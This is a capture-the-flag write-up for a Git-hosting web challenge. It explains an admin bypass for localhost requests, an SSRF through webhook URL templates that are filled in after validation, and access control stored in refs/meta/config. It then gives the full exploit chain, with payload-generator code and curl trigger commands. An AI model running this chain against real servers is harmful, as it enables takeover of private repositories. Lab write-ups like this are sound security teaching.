#Web 
## Vulnerability Analysis

### 1. Administrative Privilege Escalation
The server's authentication logic (`auth-api.ts`) contains an IP-based check. If a request originates from `127.0.0.1`, `::1`, or the IPv4-mapped IPv6 equivalent, the user is automatically granted `admin` privileges. Admins have unrestricted access to all repositories.

```typescript
const sourceIp = req.socket.remoteAddress;
if (sourceIp === "127.0.0.1" || sourceIp === "::1" || sourceIp === "::ffff:127.0.0.1") {
    req.user = { kind: "admin" };
    return next();
}
```

### 2. SSRF in Webhooks
Users can register webhooks that fire upon a `git push`. While there are filters in `git-api.ts` to prevent SSRF to localhost or non-standard ports, they are incomplete:

- **Hostname Filter Bypass**: The filter checks for `localhost` or `127.0.0.1`, but can be bypassed using services like `127.0.0.1.nip.io`.
- **Port Filter Bypass**: The filter strictly requires port `80`. However, the webhook URL supports template strings like `{{branch}}`, which are formatted **after** the URL validation occurs.

```typescript
// From git-api.ts (The "Check")
const validationUrl = new URL(url);
if (validationUrl.port !== "" && validationUrl.port !== "80") {
    throw new Error("Url must go to port 80");
}

// From git-api.ts (The "Action")
const url = formatString(webhook.url, options); // options contains {{branch}}
await fetch(url, { ... });
```

### 3. Git Access Configuration
Repository permissions are managed via a special Git reference: `refs/meta/config`. Within this branch, a file called `access.conf` lists the usernames allowed to access the repository. By pushing to this branch, we can grant our own user access to the secret repository.

---

## Exploit Strategy

1. **Register a User**: Create an account (e.g., `attacker69`).
2. **Craft a Valid Git Pack**: Generate a `git-receive-pack` payload that adds `attacker69` to `access.conf` in the `refs/meta/config` branch.
   - *Note: The provided `generate_payload.js` was broken because it failed to include the necessary tree and blob objects in the pack file. We must use `git rev-list --objects` to ensure all objects are packed.*
3. **Template Injection**: Create a webhook with the URL `http://{{branch}}/_/attacker69.git/git-receive-pack`. 
   - During creation, `{{branch}}` is treated as the hostname and passes the port 80 check.
4. **Trigger SSRF**: Send a raw `git-receive-pack` request to the server, claiming a push to a branch named `localhost:1823`. 
   - Although Git will reject the "funny refname," the server extracts the branch name and substitutes it into the webhook URL.
   - This results in a request to `http://localhost:1823/_/attacker69.git/git-receive-pack`.
5. **Privilege Execution**: The internal request hits the server from `127.0.0.1`, gaining admin rights. The server processes our malicious push, updating the permissions for `_/attacker69.git`.
6. **Flag Retrieval**: Access the secret repo README via the API using our now-authorized user.

---

## Step-by-Step Execution

### 1. Fix the Payload Generator
The payload must include all objects.

```javascript
// In exploit_payload.js
const commitHash = (await git('rev-parse', ['HEAD'], undefined, tmpdir)).toString().trim();
const objectList = (await git('rev-list', ['--objects', 'HEAD'], undefined, tmpdir)).toString().split('\n').map(l => l.split(' ')[0]).join('\n');
const pack = await git('pack-objects', ['--stdout'], objectList, tmpdir);
```

### 2. Set Up Webhook
Register a user and add a webhook to a repository you own:
- **URL**: `http://{{branch}}/_/attacker69.git/git-receive-pack`
- **Body**: The Base64 encoded payload from our fixed generator.

### 3. Fire the Trigger
Use `curl` to send a raw Git push notification with the malicious branch name:
```bash
# trigger.bin contains a Pkt-Line ref update for "refs/heads/localhost:1823"
curl -X POST https://<target>/c5/attacker69/exploit.git/git-receive-pack \
     --data-binary @trigger.bin
```

### 4. Read the Flag
```bash
curl https://<target>/c5/_/attacker69.git/api/readme?ref=refs/heads/master
```

**Flag**: `CTF{g3t_th32_g!t_@vatar}`
